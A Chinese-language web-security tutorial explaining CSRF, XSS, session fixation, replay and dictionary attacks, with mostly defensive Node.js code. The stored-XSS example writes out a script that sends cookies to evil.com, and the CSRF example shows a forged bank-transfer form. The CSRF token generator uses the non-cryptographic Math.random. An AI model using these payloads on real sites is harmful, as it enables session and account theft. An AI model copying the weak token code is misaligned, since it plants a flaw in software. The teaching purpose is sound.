---
title: 17、常见攻击方式与防御
---
## 📚 目录

1. [CSRF攻击原理与防护](#1-CSRF攻击原理与防护)
2. [XSS攻击与输出过滤](#2-XSS攻击与输出过滤)
3. [Session Fixation会话固定攻击](#3-Session-Fixation会话固定攻击)
4. [重放攻击与字典攻击](#4-重放攻击与字典攻击)
5. [Token泄露后的补救机制](#5-Token泄露后的补救机制)
6. [核心要点总结](#6-核心要点总结)

---

## 1. 🎯 CSRF攻击原理与防护


### 1.1 什么是CSRF攻击


**🔥 简单理解**
CSRF（Cross-Site Request Forgery）跨站请求伪造，说白了就是：**坏人利用你的身份，偷偷执行你不知道的操作**。

**💡 生活化比喻**
```
想象这个场景：
你登录了网上银行，还没退出
然后点击了一个恶意链接
这个链接悄悄让你的浏览器给银行发送了转账请求
银行看到是你的Cookie，以为是你本人操作，就执行了转账

这就是CSRF攻击！
```

### 1.2 CSRF攻击原理详解


**🔍 攻击流程图示**
```
用户 ----------> 银行网站
  ↑               ↓
  |           设置Cookie
  |               ↓
恶意网站 <-------- 用户浏览器
  ↓
伪造请求 --------> 银行网站
                   ↓
                银行以为是用户操作
                   ↓
                执行转账
```

**📋 具体攻击步骤**
```
第1步：用户登录银行网站 bank.com
第2步：银行设置Cookie（用户身份凭证）
第3步：用户访问恶意网站 evil.com  
第4步：恶意网站包含隐藏的表单：
       <form action="http://bank.com/transfer" method="POST">
         <input name="to" value="攻击者账户">  
         <input name="amount" value="10000">
       </form>
第5步：表单自动提交，浏览器带着Cookie发送请求
第6步：银行收到请求，看到有效Cookie，执行转账
```

### 1.3 CSRF Token防护机制


**🛡️ 防护原理**
CSRF Token就像是**暗号**，只有真正的用户页面知道这个暗号，恶意网站不知道。

**💻 实现示例**
```html
<!-- 银行转账页面 -->
<form action="/transfer" method="POST">
  <!-- 这个token是关键！恶意网站拿不到 -->
  <input type="hidden" name="csrf_token" value="abc123xyz">
  <input name="to" placeholder="转账账户">
  <input name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>
```

```javascript
// 后端验证CSRF Token
app.post('/transfer', (req, res) => {
  const clientToken = req.body.csrf_token;
  const serverToken = req.session.csrf_token;
  
  // 验证token是否匹配
  if (clientToken !== serverToken) {
    return res.status(403).json({error: '非法请求'});
  }
  
  // token正确，执行转账
  executeTransfer(req.body.to, req.body.amount);
});
```

**🔑 Token生成策略**
```javascript
// 生成随机CSRF Token
function generateCSRFToken() {
  return Math.random().toString(36).substring(2) + 
         Date.now().toString(36);
}

// 存储在用户会话中
session.csrf_token = generateCSRFToken();
```

### 1.4 其他CSRF防护方法


**📌 SameSite Cookie**
```javascript
// 设置Cookie只能同域使用
res.cookie('sessionId', 'user123', {
  sameSite: 'strict',  // 严格模式，跨站请求不发送
  httpOnly: true       // 防止JavaScript读取
});
```

**🔍 Referer检查**
```javascript
// 检查请求来源
app.use((req, res, next) => {
  const referer = req.get('Referer');
  const allowedDomains = ['https://mybank.com'];
  
  if (!allowedDomains.some(domain => referer?.startsWith(domain))) {
    return res.status(403).json({error: '请求来源不合法'});
  }
  next();
});
```

---

## 2. 💀 XSS攻击与输出过滤


### 2.1 什么是XSS攻击


**🔥 简单理解**
XSS（Cross-Site Scripting）跨站脚本攻击，就是：**攻击者想办法在网页里插入恶意代码，当其他用户浏览时就中招了**。

**💡 生活化比喻**
```
就像是在公告板上贴小广告：
正常情况：用户发布 "今天天气不错"
XSS攻击：用户发布 "今天天气不错<script>偷取Cookie</script>"
其他人看到这条消息时，恶意脚本就执行了
```

### 2.2 XSS攻击类型详解


**📊 三种XSS攻击类型对比**

| 类型 | **存储型XSS** | **反射型XSS** | **DOM型XSS** |
|------|---------------|---------------|--------------|
| 🎯 **特点** | `恶意代码存在服务器` | `恶意代码在URL参数` | `恶意代码在前端DOM` |
| ⚡ **触发** | `访问页面就执行` | `点击恶意链接执行` | `前端处理时执行` |
| 💥 **危害** | `影响所有访问者` | `影响点击链接的人` | `影响特定用户` |

**🔍 存储型XSS示例**
```html
<!-- 用户在留言板输入 -->
用户输入：我觉得这个产品很好<script>document.location='http://evil.com?cookie='+document.cookie</script>

<!-- 存储到数据库后，其他用户访问时页面显示 -->
<div class="comment">
  我觉得这个产品很好<script>document.location='http://evil.com?cookie='+document.cookie</script>
</div>
<!-- 恶意脚本执行，用户Cookie被盗取 -->
```

**🔍 反射型XSS示例**
```html
<!-- 恶意链接 -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- 服务器直接输出搜索关键词 -->
<div>搜索结果：<script>alert('XSS')</script></div>
```

### 2.3 输出过滤防护机制


**🛡️ HTML实体编码**
```javascript
// 将危险字符转义
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')    // & 转为 &amp;
    .replace(/</g, '&lt;')     // < 转为 &lt;
    .replace(/>/g, '&gt;')     // > 转为 &gt;
    .replace(/"/g, '&quot;')   // " 转为 &quot;
    .replace(/'/g, '&#x27;');  // ' 转为 &#x27;
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeOutput = escapeHTML(userInput);
// 结果: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
```

**🔧 白名单过滤**
```javascript
// 只允许安全的HTML标签
const DOMPurify = require('dompurify');

function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: ['class']
  });
}

// 使用示例
const userHTML = '<b>粗体</b><script>alert("XSS")</script>';
const safeHTML = sanitizeHTML(userHTML);
// 结果: <b>粗体</b>（script标签被移除）
```

**💻 Vue.js中的XSS防护**
```vue
<template>
  <!-- 安全：自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- 危险：直接输出HTML -->
  <div v-html="userInput"></div>
  
  <!-- 安全：使用过滤后的HTML -->
  <div v-html="sanitizedInput"></div>
</template>

<script>
export default {
  data() {
    return {
      userInput: '<script>alert("XSS")</script>'
    }
  },
  computed: {
    sanitizedInput() {
      return this.escapeHTML(this.userInput);
    }
  }
}
</script>
```

### 2.4 CSP内容安全策略


**🔒 CSP防护原理**
CSP就像是给网页设置**安全规则**，规定什么代码可以执行，什么不能执行。

```html
<!-- 设置CSP头部 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://cdn.example.com">

<!-- 这个规则的意思是：
     - 默认只能加载同域资源
     - JavaScript只能从本域和cdn.example.com加载 -->
```

---

## 3. 🔐 Session Fixation会话固定攻击


### 3.1 什么是会话固定攻击


**🔥 简单理解**
Session Fixation就是：**攻击者提前准备好一个会话ID，想办法让用户使用这个ID登录，然后攻击者就能冒充用户了**。

**💡 生活化比喻**
```
想象酒店房卡的场景：
正常情况：你登记入住，酒店给你一张新房卡
会话固定攻击：
1. 攻击者提前拿到一张空白房卡（会话ID）
2. 想办法让你用这张房卡去登记
3. 你登记成功后，这张房卡就能开你的房间了
4. 攻击者用同一张房卡就能进入你的房间
```

### 3.2 攻击流程详解


**📋 攻击步骤图示**
```
攻击者 -----------> 网站
   ↓               ↓
获取会话ID      生成会话ID
(JSESSIONID=ABC123)
   ↓
发送链接给用户
   ↓
用户点击链接 -----> 网站
(带着ABC123)       ↓
   ↓           使用ABC123会话
用户登录成功        ↓
   ↓           会话ABC123变为已认证
攻击者使用ABC123 --> 网站
                   ↓
                以用户身份访问
```

**💻 具体攻击示例**
```html
<!-- 1. 攻击者获取会话ID -->
GET http://example.com/login
返回: Set-Cookie: JSESSIONID=ABC123

<!-- 2. 攻击者构造恶意链接 -->
<a href="http://example.com/login?JSESSIONID=ABC123">
  点击查看优惠信息
</a>

<!-- 3. 用户点击链接并登录 -->
用户在ABC123会话中成功登录

<!-- 4. 攻击者使用相同会话ID -->
Cookie: JSESSIONID=ABC123
现在攻击者就能以用户身份操作了！
```

### 3.3 防护机制详解


**🛡️ 登录后重新生成会话ID**
```javascript
// Node.js + Express 示例
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // 验证用户凭据
  if (validateUser(username, password)) {
    // 关键：销毁旧会话
    req.session.destroy(() => {
      // 创建新会话
      req.session.regenerate(() => {
        req.session.user = username;
        res.json({ success: true });
      });
    });
  }
});
```

**🔒 会话ID绑定检查**
```javascript
// 绑定IP地址和User-Agent
app.use((req, res, next) => {
  if (req.session.user) {
    // 检查IP地址是否变化
    if (req.session.ip && req.session.ip !== req.ip) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalid' });
    }
    
    // 检查User-Agent是否变化
    const userAgent = req.get('User-Agent');
    if (req.session.userAgent && req.session.userAgent !== userAgent) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalid' });
    }
    
    // 首次登录时记录这些信息
    req.session.ip = req.ip;
    req.session.userAgent = userAgent;
  }
  next();
});
```

---

## 4. 🔄 重放攻击与字典攻击


### 4.1 重放攻击详解


**🔥 什么是重放攻击**
重放攻击就是：**攻击者截获了你的请求数据，然后反复发送这个请求来达到恶意目的**。

**💡 生活化比喻**
```
就像录音机重播：
你对银行说："转账1000元给张三"
攻击者录下了这句话
然后不停地重播这句话给银行听
银行每听一次就转账一次
你的钱就被转光了
```

**📋 重放攻击流程**
```
用户 ---------> 银行
   |            |
   | 转账请求    |
   |            |
攻击者截获请求   |
   |            |
   | 重复发送    |
   | 相同请求    |
   |            ↓
   |         银行重复执行转账
   |            |
   |         用户余额被清空
```

**🛡️ 重放攻击防护**

**⏰ 时间戳验证**
```javascript
// 请求中包含时间戳
const request = {
  action: 'transfer',
  amount: 1000,
  timestamp: Date.now()
};

// 服务器验证时间戳
app.post('/transfer', (req, res) => {
  const { timestamp } = req.body;
  const now = Date.now();
  const fiveMinutes = 5 * 60 * 1000;
  
  // 请求超过5分钟就拒绝
  if (now - timestamp > fiveMinutes) {
    return res.status(400).json({ error: '请求已过期' });
  }
  
  // 执行转账
  executeTransfer(req.body);
});
```

**🔢 随机数(Nonce)验证**
```javascript
// 每个请求包含唯一随机数
const request = {
  action: 'transfer',
  amount: 1000,
  nonce: generateRandomString()
};

// 服务器记录已使用的nonce
const usedNonces = new Set();

app.post('/transfer', (req, res) => {
  const { nonce } = req.body;
  
  // 检查nonce是否已使用
  if (usedNonces.has(nonce)) {
    return res.status(400).json({ error: '重复请求' });
  }
  
  // 记录nonce并执行请求
  usedNonces.add(nonce);
  executeTransfer(req.body);
});
```

### 4.2 字典攻击详解


**🔥 什么是字典攻击**
字典攻击就是：**攻击者用常见密码列表（字典）来逐个尝试破解你的密码**。

**📚 常见密码字典**
```
Top 10 最常用密码：
1. 123456
2. password  
3. 123456789
4. 12345678
5. 12345
6. 111111
7. 1234567
8. sunshine
9. qwerty
10. iloveyou

攻击者会用这些密码逐个尝试
```

**🛡️ 字典攻击防护策略**

**⏰ 登录限流**
```javascript
// 记录失败尝试次数
const loginAttempts = new Map();

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const clientIP = req.ip;
  
  // 检查尝试次数
  const attempts = loginAttempts.get(clientIP) || 0;
  if (attempts >= 5) {
    return res.status(429).json({ 
      error: '登录尝试过多，请30分钟后再试' 
    });
  }
  
  // 验证密码
  if (!validatePassword(username, password)) {
    // 增加失败计数
    loginAttempts.set(clientIP, attempts + 1);
    
    // 30分钟后清除计数
    setTimeout(() => {
      loginAttempts.delete(clientIP);
    }, 30 * 60 * 1000);
    
    return res.status(401).json({ error: '用户名或密码错误' });
  }
  
  // 登录成功，清除计数
  loginAttempts.delete(clientIP);
  res.json({ success: true });
});
```

**🎯 验证码防护**
```javascript
app.post('/login', (req, res) => {
  const { username, password, captcha } = req.body;
  
  // 验证码检查
  if (!verifyCaptcha(captcha, req.session.captcha)) {
    return res.status(400).json({ error: '验证码错误' });
  }
  
  // 验证密码...
});
```

---

## 5. 🚨 Token泄露后的补救机制


### 5.1 Token泄露的常见原因


**⚠️ 泄露途径盘点**
```
📱 客户端存储不当：
- 存储在localStorage（XSS可读取）
- 存储在URL中（日志记录）
- 存储在不安全的Cookie中

🌐 网络传输问题：
- HTTP明文传输
- 中间人攻击截获
- 网络监听设备窃取

💻 代码层面问题：
- 日志中记录敏感信息
- 错误信息泄露Token
- 调试信息未清理
```

### 5.2 Token黑名单机制


**🚫 黑名单实现原理**
当发现Token泄露时，立即将其加入黑名单，让这个Token失效。

**💻 黑名单实现示例**
```javascript
// 黑名单存储（使用Redis）
const redis = require('redis');
const client = redis.createClient();

class TokenBlacklist {
  // 将Token加入黑名单
  static async addToBlacklist(token, reason) {
    const tokenHash = this.hashToken(token);
    await client.setex(
      `blacklist:${tokenHash}`, 
      3600 * 24 * 7,  // 7天过期
      JSON.stringify({
        reason: reason,
        timestamp: Date.now()
      })
    );
    
    console.log(`Token已加入黑名单: ${reason}`);
  }
  
  // 检查Token是否在黑名单中
  static async isBlacklisted(token) {
    const tokenHash = this.hashToken(token);
    const result = await client.get(`blacklist:${tokenHash}`);
    return result !== null;
  }
  
  // Token哈希（避免存储原始Token）
  static hashToken(token) {
    return crypto.createHash('sha256').update(token).digest('hex');
  }
}

// 中间件检查黑名单
app.use(async (req, res, next) => {
  const token = extractToken(req);
  
  if (token && await TokenBlacklist.isBlacklisted(token)) {
    return res.status(401).json({ 
      error: 'Token已失效，请重新登录' 
    });
  }
  
  next();
});
```

### 5.3 IP地址绑定机制


**🌍 IP绑定原理**
将Token与特定IP地址绑定，如果检测到异常IP访问，立即阻止。

**💻 IP绑定实现**
```javascript
class TokenIPBinding {
  // 创建Token时绑定IP
  static async createTokenWithIP(userId, clientIP) {
    const token = generateJWT(userId);
    const tokenId = extractTokenId(token);
    
    // 存储Token-IP绑定关系
    await redis.setex(
      `token_ip:${tokenId}`,
      3600 * 24,  // 24小时
      clientIP
    );
    
    return token;
  }
  
  // 验证Token时检查IP
  static async validateTokenIP(token, clientIP) {
    const tokenId = extractTokenId(token);
    const boundIP = await redis.get(`token_ip:${tokenId}`);
    
    if (!boundIP) {
      throw new Error('Token绑定信息不存在');
    }
    
    if (boundIP !== clientIP) {
      // IP不匹配，可能被盗用
      await TokenBlacklist.addToBlacklist(token, 'IP地址异常');
      throw new Error('Token使用环境异常');
    }
    
    return true;
  }
}

// 使用示例
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const clientIP = req.ip;
  
  if (validateUser(username, password)) {
    const token = await TokenIPBinding.createTokenWithIP(
      username, 
      clientIP
    );
    
    res.json({ token });
  }
});

// 验证中间件
app.use(async (req, res, next) => {
  const token = extractToken(req);
  const clientIP = req.ip;
  
  try {
    await TokenIPBinding.validateTokenIP(token, clientIP);
    next();
  } catch (error) {
    res.status(401).json({ error: error.message });
  }
});
```

### 5.4 设备指纹识别


**📱 设备指纹原理**
通过收集设备特征信息（浏览器版本、屏幕分辨率、时区等）生成唯一标识。

**💻 设备指纹实现**
```javascript
// 前端收集设备信息
function generateDeviceFingerprint() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.fillText('Device fingerprint', 2, 2);
  
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    canvas: canvas.toDataURL(),
    webgl: getWebGLFingerprint()
  };
}

// 生成设备指纹哈希
function hashFingerprint(fingerprint) {
  return crypto.createHash('md5')
    .update(JSON.stringify(fingerprint))
    .digest('hex');
}

// 后端验证设备指纹
app.use(async (req, res, next) => {
  const token = extractToken(req);
  const deviceFingerprint = req.headers['x-device-fingerprint'];
  
  if (token && deviceFingerprint) {
    const tokenId = extractTokenId(token);
    const storedFingerprint = await redis.get(`device:${tokenId}`);
    
    if (storedFingerprint && storedFingerprint !== deviceFingerprint) {
      await TokenBlacklist.addToBlacklist(token, '设备环境异常');
      return res.status(401).json({ error: '设备验证失败' });
    }
  }
  
  next();
});
```

### 5.5 Token轮换机制


**🔄 自动轮换策略**
定期更新Token，即使旧Token泄露，影响时间也有限。

**💻 Token轮换实现**
```javascript
class TokenRotation {
  // 生成Token对（访问Token + 刷新Token）
  static generateTokenPair(userId) {
    const accessToken = generateJWT(userId, '15m');   // 15分钟
    const refreshToken = generateJWT(userId, '7d');   // 7天
    
    return { accessToken, refreshToken };
  }
  
  // 使用刷新Token获取新的访问Token
  static async refreshAccessToken(refreshToken) {
    try {
      const payload = verifyJWT(refreshToken);
      
      // 检查刷新Token是否在黑名单
      if (await TokenBlacklist.isBlacklisted(refreshToken)) {
        throw new Error('刷新Token已失效');
      }
      
      // 生成新的Token对
      const newTokens = this.generateTokenPair(payload.userId);
      
      // 将旧的刷新Token加入黑名单
      await TokenBlacklist.addToBlacklist(
        refreshToken, 
        '已刷新，自动失效'
      );
      
      return newTokens;
    } catch (error) {
      throw new Error('Token刷新失败');
    }
  }
}

// 自动刷新中间件
app.use('/api', async (req, res, next) => {
  const accessToken = extractToken(req);
  
  try {
    verifyJWT(accessToken);
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ 
        error: 'Access token expired',
        code: 'TOKEN_EXPIRED'
      });
    }
    throw error;
  }
});

// 刷新Token端点
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  try {
    const newTokens = await TokenRotation.refreshAccessToken(refreshToken);
    res.json(newTokens);
  } catch (error) {
    res.status(401).json({ error: error.message });
  }
});
```

---

## 6. 📋 核心要点总结


### 6.1 攻击防护要点记忆


**🎯 CSRF防护核心**
```
记忆口诀："Token验证身份真，来源检查更安心"

核心防护：
✅ CSRF Token - 暗号验证
✅ SameSite Cookie - 限制跨域
✅ Referer检查 - 验证来源
✅ 双重验证 - 重要操作确认
```

**🎯 XSS防护核心**
```
记忆口诀："输入过滤输出转，白名单限制保平安"

核心防护：
✅ 输出转义 - HTML实体编码
✅ 输入验证 - 白名单过滤
✅ CSP策略 - 限制脚本执行
✅ HttpOnly Cookie - 防止脚本读取
```

**🎯 会话安全核心**
```
记忆口诀："登录重生成，绑定IP和设备"

核心防护：
✅ 会话重新生成 - 登录后换新ID
✅ IP绑定 - 限制使用环境
✅ 超时管理 - 定期失效
✅ 安全传输 - HTTPS Only
```

### 6.2 Token安全防护体系


**🛡️ 多层防护策略**
```
第1层：预防泄露
├── HTTPS传输加密
├── 安全存储位置
└── 最小权限原则

第2层：检测异常
├── IP地址监控
├── 设备指纹识别
└── 行为模式分析

第3层：快速响应
├── 黑名单机制
├── 紧急撤销
└── Token轮换

第4层：损失控制
├── 权限隔离
├── 操作审计
└── 异常告警
```

### 6.3 安全最佳实践清单


**✅ 开发阶段**
- [ ] 所有用户输入都进行验证和转义
- [ ] 敏感操作必须有CSRF保护
- [ ] 实现完整的会话管理机制
- [ ] 设置合适的安全响应头

**✅ 部署阶段**
- [ ] 启用HTTPS并强制重定向
- [ ] 配置安全的Cookie属性
- [ ] 设置适当的CORS策略
- [ ] 启用日志监控和告警

**✅ 运维阶段**
- [ ] 定期检查安全日志
- [ ] 监控异常访问模式
- [ ] 保持安全组件更新
- [ ] 建立应急响应流程

### 6.4 应急响应流程


**🚨 Token泄露应急处理**
```
发现泄露
    ↓
立即分析影响范围
    ↓
将泄露Token加入黑名单
    ↓
通知受影响用户重新登录
    ↓
分析泄露原因
    ↓
修复安全漏洞
    ↓
加强监控措施
    ↓
总结经验教训
```

**核心记忆要点**：
- 🎯 **预防为主**：多层防护，不依赖单一机制
- 🔍 **及时发现**：监控异常，快速响应处理
- 🛡️ **深度防御**：即使一层被突破，其他层仍能保护
- 📚 **持续学习**：安全威胁不断演进，防护也要跟上

> 💡 **安全金句**
> 
> *"安全不是产品，而是过程；不是终点，而是旅程"*